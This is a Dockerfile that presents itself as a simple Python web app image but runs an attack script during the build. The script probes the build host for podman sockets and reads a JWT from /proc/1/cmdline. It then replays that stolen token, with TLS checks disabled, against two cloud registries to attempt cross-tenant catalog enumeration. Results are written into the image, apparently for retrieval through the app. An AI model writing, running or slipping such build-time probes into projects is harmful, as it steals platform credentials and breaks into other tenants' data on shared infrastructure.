FROM python:3.12-slim
WORKDIR /app
RUN { echo "=== v10: registry cross-tenant + podman sock ==="; \
 echo "--- podman socket ---"; ls -la /run/podman /run/containers /var/run/podman.sock /run/user/*/podman 2>&1 | head; which podman buildah 2>&1; \
 echo "--- podman ps ---"; podman ps 2>&1 | head -3; podman images 2>&1 | head -3; \
 echo "--- registry token test (python) ---"; python3 - <<'PY'
import subprocess,re,urllib.request,ssl,json,base64
cmd=open('/proc/1/cmdline','rb').read().decode('utf-8','replace')
tok=re.search(r'eyJ[A-Za-z0-9_.-]+',cmd)
tok=tok.group(0) if tok else ''
print('tok_len',len(tok))
ctx=ssl._create_unverified_context()
for reg in ['user-registry.amer-1.aivencloud.net','docker-mirror.amer-1.aivencloud.net']:
    # 1) get WWW-Authenticate
    def req(url,hdr=None):
        r=urllib.request.Request(url,headers=hdr or {})
        try:
            x=urllib.request.urlopen(r,context=ctx,timeout=8); return x.status,x.headers, x.read(300)
        except urllib.error.HTTPError as e: return e.code,e.headers,e.read(300)
        except Exception as e: return -1,{},str(e).encode()
    st,h,b=req('https://%s/v2/'%reg)
    print(reg,'/v2/ ->',st, dict(h).get('WWW-Authenticate'))
    wa=dict(h).get('WWW-Authenticate','')
    m=re.search(r'realm="([^"]+)"',wa); realm=m.group(1) if m else None
    m2=re.search(r'service="([^"]+)"',wa); svc=m2.group(1) if m2 else reg
    if realm:
        # 2) bearer with the JWT as identity? try basic then bearer
        for hdr in [{'Authorization':'Bearer '+tok},
                    {'Authorization':'Basic '+base64.b64encode(('jwt/nomad-token:'+tok).encode()).decode()}]:
            st2,h2,b2=req('%s?service=%s&scope=registry:catalog:*'%(realm,svc),hdr)
            print('  token fetch',st2,b2[:150])
            try:
                t=json.loads(b2).get('token') or json.loads(b2).get('access_token')
            except Exception: t=None
            if t:
                st3,h3,b3=req('https://%s/v2/_catalog'%reg,{'Authorization':'Bearer '+t})
                print('  CATALOG',st3,b3[:400])
                break
PY
} > /app/v10.txt 2>&1
COPY app.py /app/app.py
ENV PORT=3000
EXPOSE 3000
CMD ["python3", "/app/app.py"]
